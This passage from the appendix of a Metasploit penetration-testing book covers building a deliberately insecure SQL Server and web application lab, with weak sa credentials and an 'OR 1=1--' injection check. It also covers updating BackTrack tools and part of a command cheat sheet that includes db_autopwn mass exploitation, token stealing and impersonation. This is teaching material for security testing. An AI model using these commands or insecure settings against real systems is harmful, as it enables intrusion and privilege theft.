90pt;text-indent: 18pt;text-align: justify;">With the basic installation of SQL Server complete, you need to make a few more changes to make it accessible on your network:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l41"><li><p class="s18" style="padding-left: 108pt;text-indent: -18pt;text-align: left;"><span class="p">Select </span>Start<span class="s49">►</span>All Programs<span class="s49">►</span>Microsoft SQL Server 2005<span class="s49">►</span>Configuration Tools<span class="p">, and then select </span>SQL Server Configuration Manager<span class="p">.</span></p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">When the Configuration Manager starts, select <span class="s18">SQL Server 2005 Services</span>, right-click <span class="s18">SQL Server (SQLEXPRESS)</span>, and select <span class="s18">Stop</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Expand SQL Server 2005 Network Configuration Manager and select</p><p class="s18" style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Protocols for SQLEXPRESS<span class="p">, as shown in Figure A-1.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="390" height="258" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_718.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure A-1: Protocols for SQLEXPRESS</p></li><li><p style="padding-top: 8pt;padding-left: 108pt;text-indent: -18pt;line-height: 12pt;text-align: left;">Double-click <span class="s18">TCP/IP</span>, and on the Protocol tab, set <span class="s18">Enabled </span>to <span class="s18">Yes </span>and</p><p class="s18" style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Listen All <span class="p">to </span>No<span class="p">.</span></p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Next, while still within the TCP/IP Properties dialog, select the IP Addresses tab and remove any entries under IPAll. Under IP1 and IP2, remove the values for TCP Dynamic Ports and set <span class="s18">Active </span>and <span class="s18">Enabled </span>for each of them to <span class="s18">Yes</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Finally, set the IP1 IP Address to match your static IP address set earlier, set the IP2 address to <span class="s18">127.0.0.1</span>, and set the TCP port for each of them to <span class="s18">1433</span>. Your settings should look similar to those shown in Figure A-2. Click <span class="s18">OK </span>when you are all set.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Next, you’ll need to enable the SQL Server Browser service:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l42"><li><p style="padding-left: 108pt;text-indent: -18pt;text-align: left;">Select <span class="s18">SQL Server 2005 Services </span>and double-click <span class="s18">SQL Server Browser</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">On the Service tab, set the <span class="s18">Start Mode </span>to <span class="s18">Automatic</span>.</p></li></ol><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="252" height="282" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_719.gif"/></span></p><p class="s29" style="padding-top: 7pt;padding-left: 90pt;text-indent: 0pt;line-height: 107%;text-align: left;">Figure A-2: Setting SQL Server IP addresses in the TCP/IP Properties dialog</p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">By default, the SQL Server runs under the low-privilege Network Service account, which is a great default. However, it’s not entirely realistic for what we find deployed in the field, and often administrators change this rather than trying to troubleshoot permissions issues.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">On most target systems, we have found that the SQL Server Browser service is running as an elevated SYSTEM-based account. Most systems have the SQL Server Service logged on as Local System, the default in older versions of Microsoft SQL Server (2000 and earlier). Therefore, you should change the account by double-clicking <span class="s18">SQL Server (SQLEXPRESS) </span>and setting <span class="s18">Log on as </span>to <span class="s18">Local System</span><span class="s19">. </span>Click <span class="s18">OK </span>when you have finished. Then right-click <span class="s18">SQL Server (SQLEXPRESS) </span>and select <span class="s18">Start</span>. Do the same with SQL Server browser.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">Finally, close the Configuration Manager and verify that everything is working properly by opening a command prompt and running <span class="s24">netstat -ano</span></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">|find &quot;1433&quot; <span class="p">and </span>netstat -ano |find &quot;1434&quot;<span class="p">. Your IP addresses configured earlier should be listening on TCP port 1433 and UDP port 1434, as shown here:</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_720.png"/></span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Microsoft Windows XP [Version 5.1.2600]</p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">© Copyright 1985-2001 Microsoft Corp.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 11pt;text-align: left;">C:\Documents and Settings\Administrator&gt;<span class="s24">netstat -ano |find &quot;1433&quot;</span></p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">TCP      127.0.0.1:1433          0.0.0.0:0   LISTENING   512</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">TCP      192.168.1.155:1433      0.0.0.0:0   LISTENING   512</p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">C:\Documents and Settings\Administrator&gt;<span class="s24">netstat  -ano  |find  &quot;1434&quot;</span></p><p class="s25" style="padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">UDP      0.0.0:1434       *:*</p><p class="s25" style="padding-bottom: 3pt;padding-left: 42pt;text-indent: 0pt;line-height: 11pt;text-align: center;">C:\Documents and Settings\Administrator&gt;</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="437" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_721.png"/></span></p><p class="s21" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark481">Creating a Vulnerable Web Application</a><a name="bookmark490">&zwnj;</a></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="http://www.nostarch.com/metasploit.htm" class="s31" target="_blank">To use some of the more advanced features of Metasploit and external tools such as Fast-Track and the Social-Engineer Toolkit (SET), you will need a vulnerable web application to test against. To create the database and tables, download and install SQL Server Management Studio Express from the link provided at </a><a href="http://www.nostarch.com/metasploit.htm" class="s20" target="_blank">http://www.nostarch.com/metasploit.htm</a><a href="http://www.nostarch.com/metasploit.htm" class="s31" target="_blank">.</a></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">After the installation and a healthy reboot, do the following:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l43"><li><p class="s18" style="padding-left: 108pt;text-indent: -18pt;text-align: justify;"><span class="p">Start the application by choosing </span>Start<span class="s49">►</span>All Programs<span class="s49">►</span>Microsoft SQL Server 2005<span class="s49">►</span>SQL Server Management Studio Express<span class="p">.</span></p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: justify;">When prompted for credentials, select <span class="s18">SQL Server Authentication </span>from the Authentication drop-down, and log in using the username <span class="s19">sa </span>and the password <span class="s19">password1</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">In Object Explorer, right-click <span class="s18">Databases </span>and select <span class="s18">New Database</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">For the Database name, enter <span class="s18">WebApp </span>and click <span class="s18">OK</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Expand Databases and the WebApp database tree.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Right-click <span class="s18">Tables </span>and select <span class="s18">New Table</span>. Name your new table <span class="s19">users </span>with the column names and types shown in Figure A-3.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="366" height="102" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_722.gif"/></span></p><p class="s29" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure A-3: <span class="s30">Users </span>table columns</p></li><li><p style="padding-top: 4pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Save the <span class="s19">users </span>table, and then right-click it and select <span class="s18">Open Table</span>.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Populate the table with some sample data similar to that shown in Figure A-4, and then save your work.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 109pt;text-indent: 0pt;text-align: left;"><span><img width="403" height="80" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_723.gif"/></span></p><p class="s29" style="padding-top: 4pt;padding-left: 108pt;text-indent: 0pt;text-align: left;">Figure A-4: Populated <span class="s30">users </span>table</p></li><li><p style="padding-top: 4pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Expand the Security tree under Object Explorer, and then expand Logins.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Right-click <span class="s18">Logins </span>in the User Properties window and select <span class="s18">New Login</span>. In the Login-New window, click <span class="s18">Search</span>, enter <span class="s18">ASPNET</span>, and then click <span class="s18">Check Names</span>. The full username should automatically populate. Click <span class="s18">OK </span>to exit the user search.</p></li><li><p style="padding-top: 2pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Finally, while still in the User Properties window, select <span class="s18">User Mapping</span>, select the check box next to <span class="s18">WebApp</span>, select the <span class="s18">db_owner </span>role member- ship, and then click <span class="s18">OK</span>.</p></li></ol><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">That takes care of the entire configuration required on the SQL backend for the web application. Save and exit Management Studio.</p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">All that remains is to create the website to interact with the database you created. Let’s do that now:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><ol id="l44"><li><p class="s19" style="padding-left: 108pt;text-indent: -18pt;text-align: left;"><a href="http://www.nostarch.com/" class="s31" target="_blank">Download the vulnerable web application from </a>http://www.nostarch.com/ metasploit.htm <span class="p">and extract the contents of the archive to </span>C:\Inetpub\wwwroot\.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Open your browser and point to <span class="s19">http://&lt;youripaddress&gt;/Default.aspx</span>. You should see a log-in form, as shown in Figure A-5.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: left;">Enter bogus credentials to verify that the SQL query is being executed properly. To test some basic SQL injection to identify whether the web application is functioning properly, enter a single quote (<span class="s24">&#39;</span>) in the user- name field, and enter anything as the password (doesn’t matter). The application should produce a yellow page with a SQL-related error.</p></li><li><p style="padding-top: 3pt;padding-left: 108pt;text-indent: -18pt;text-align: justify;">Click the back arrow on your browser and enter <span class="s18">OR 1=1-- </span>and something (doesn’t matter) in the password field. You should see a “You have success- fully logged on” message.</p></li></ol><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">If you have gotten this far, everything is set up properly, and you are ready to plunge in.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;text-align: left;"><span><img width="406" height="269" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_724.gif"/></span></p><p class="s29" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Figure A-5: Sample attack website</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s21" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a name="bookmark482">Updating Back|Track</a><a name="bookmark491">&zwnj;</a></p><p style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">As with any operating system, make sure you’re running the latest version of Back|Track and its tools. When logging into Back|Track (<span class="s19">root</span>/<span class="s19">toor</span>), issue the following commands:</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_725.png"/></span></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: justify;">root@bt:~# <span class="s24">apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get dist-upgrade</span></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="431" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_726.png"/></span></p><p style="padding-top: 3pt;padding-left: 90pt;text-indent: 18pt;text-align: left;">This sequence of commands will select all available updates within Back|Track. After you have updated Back|Track by entering <span class="s24">y </span>(for yes) when prompted to accept the SVN certificate, your system still needs some minor updates to Metasploit, Fast-Track, and the SET.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="445" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_727.png"/></span></p><p class="s25" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;"><span class="s30">O </span>root@bt:~# <span class="s24">cd /opt/framework3/msf3</span>/</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 13pt;text-align: left;">8 <span class="s25">root@bt:/opt/framework3/msf3# </span><span class="s24">msfupdate</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Updated to revision XXXX.</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">@ <span class="s25">root@bt:/opt/framework3/msf3# </span><span class="s24">cd /pentest/exploits/set/</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root@bt:/pentest/exploits/set# <span class="s24">svn update</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Updated to revision XXXX.</p><p class="s30" style="padding-left: 78pt;text-indent: 0pt;line-height: 12pt;text-align: left;">O <span class="s25">root@bt:/pentest/exploits/set# </span><span class="s24">cd /pentest/exploits/fasttrack/</span></p><p class="s25" style="padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">root@bt:/pentest/exploits/fasttrack# <span class="s24">svn update</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s24" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">. . . SNIP . . .</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s25" style="padding-bottom: 3pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">At revision XXXX. root@bt:/pentest/exploits/fasttrack#</p><p style="padding-left: 90pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_728.png"/></span></p><p style="padding-top: 7pt;padding-left: 90pt;text-indent: 18pt;line-height: 82%;text-align: left;">In Back|Track, Metasploit is located at <span class="s19">/opt/framework3/msf3/ </span><span class="s32">O</span>, so change to that directory prior to updating the Framework via subversion with <span class="s24">msfupdate </span><span class="s32">8</span>.</p><p style="padding-left: 90pt;text-indent: 18pt;line-height: 69%;text-align: left;">Once Metasploit is updated, change to <span class="s19">/pentest/exploits/set</span><span class="s25">/ </span><span class="s32">@ </span>and run <span class="s24">svn update</span>. Lastly, change to <span class="s19">/pentest/exploits/fasttrack</span><span class="s25">/ </span><span class="s32">O </span>and update Fast-Track.</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 11pt;text-align: left;">You have now created and updated the testing environment that you will</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">use as you work through the examples in this book.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 234pt;text-indent: 0pt;text-align: left;"><span><img width="63" height="121" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_729.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 7pt;padding-left: 186pt;text-indent: 0pt;text-align: left;"><a name="bookmark492">CHEAT SHEET </a><a name="bookmark501">&zwnj;</a><a name="bookmark502">&zwnj;</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s17" style="padding-left: 90pt;text-indent: 0pt;text-align: left;"><a href="#bookmark510" class="s53">Here is a reference for the most frequently used com- mands and syntax within Metasploit’s various interfaces and utilities. See “Meterpreter Post Exploitation Com- </a>mands” on page 282 for some all-in-one commands that will make your life easier.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark493">MSFconsole Commands</a><a name="bookmark503">&zwnj;</a></p><p class="s24" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">show exploits</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show all exploits within the Framework.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">show payloads</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show all payloads within the Framework.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">show auxiliary</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show all auxiliary modules within the Framework.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">search <i>name</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Search for exploits or modules within the Framework.</p><p class="s24" style="padding-top: 3pt;text-indent: 0pt;text-align: right;">info</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;">Load information about a specific exploit or module.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">use <i>name</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Load an exploit or module (example: <span class="s54">use windows/smb/psexec</span>).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">LHOST</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Your local host’s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">RHOST</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">The remote host or the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">set <i>function</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Set a specific value (for example, <span class="s25">LHOST </span>or <span class="s25">RHOST</span>).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">setg <i>function</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Set a specific value globally (for example, <span class="s25">LHOST </span>or <span class="s25">RHOST</span>).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">show options</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show the options available for a module or exploit.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">show targets</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show the platforms supported by the exploit.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">set target <i>num</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Specify a specific target index if you know the OS and service pack.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">set payload <i>payload</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Specify the payload to use.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">show advanced</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show advanced options.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">set autorunscript migrate -f</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Automatically migrate to a separate process upon exploit completion.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">check</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Determine whether a target is vulnerable to an attack.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploit</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Execute the module or exploit and attack the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploit -j</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Run the exploit under the context of the job. (This will run the exploit in the background.)</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploit -z</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Do not interact with the session after successful exploitation.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploit -e <i>encoder</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Specify the payload encoder to use (example: <span class="s25">exploit –e shikata_ga_nai</span>).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">exploit -h</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Display help for the <span class="s25">exploit </span>command.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sessions -l</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List available sessions (used when handling multiple shells).</p><p class="s24" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sessions -l -v</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">List all available sessions and show verbose fields, such as which vulnera- bility was used when exploiting the system.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sessions -s <i>script</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Run a specific Meterpreter script on all Meterpreter live sessions.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sessions -K</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Kill all live sessions.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sessions -c <i>cmd</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Execute a command on all live Meterpreter sessions.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sessions -u <i>sessionID</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Upgrade a normal Win32 shell to a Meterpreter console.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_create <i>name</i></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Create a database to use with database-driven attacks (example: <span class="s25">db_create autopwn</span>).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_connect <i>name</i></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Create and connect to a database for driven attacks (example: <span class="s25">db_connect autopwn</span>).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_nmap</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Use <span class="s19">nmap </span>and place results in database. (Normal <span class="s19">nmap </span>syntax is supported, such as <span class="s25">–sT –v –P0</span>.)</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_autopwn -h</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Display help for using <span class="s25">db_autopwn</span>.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_autopwn -p -r -e</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Run <span class="s25">db_autopwn </span>against all ports found, use a reverse shell, and exploit all systems.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_destroy</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Delete the current database.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">db_destroy <i>user:password@host:port/database</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Delete database using advanced options.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s4" style="padding-left: 36pt;text-indent: 0pt;text-align: left;"><a name="bookmark494">Meterpreter Commands</a><a name="bookmark504">&zwnj;</a></p><p class="s24" style="padding-top: 9pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">help</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Open Meterpreter usage help.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">run <i>scriptname</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Run Meterpreter-based scripts; for a full list check the <span class="s19">scripts/meterpreter</span></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">directory.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">sysinfo</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Show the system information on the compromised target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ls</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List the files and folders on the target.</p><p class="s24" style="padding-top: 3pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">use priv</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Load the privilege extension for extended Meterpreter libraries.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ps</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Show all running processes and which accounts are associated with each process.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">migrate <i>PID</i></p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Migrate to the specific process ID (PID is the target process ID gained from the <span class="s25">ps </span>command).</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">use incognito</p><p style="padding-left: 108pt;text-indent: 0pt;text-align: left;">Load <span class="s19">incognito </span>functions. (Used for token stealing and impersonation on a target machine.)</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">list_tokens -u</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List available tokens on the target by user.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">list_tokens -g</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">List available tokens on the target by group.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">impersonate_token DOMAIN_NAME\\USERNAME</p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Impersonate a token available on the target.</p><p class="s24" style="padding-top: 6pt;padding-left: 90pt;text-indent: 0pt;line-height: 10pt;text-align: left;">steal_token <i>PID</i></p><p style="padding-left: 108pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Steal the tokens available for a given process and impersonate that token.</p><p class="s24" 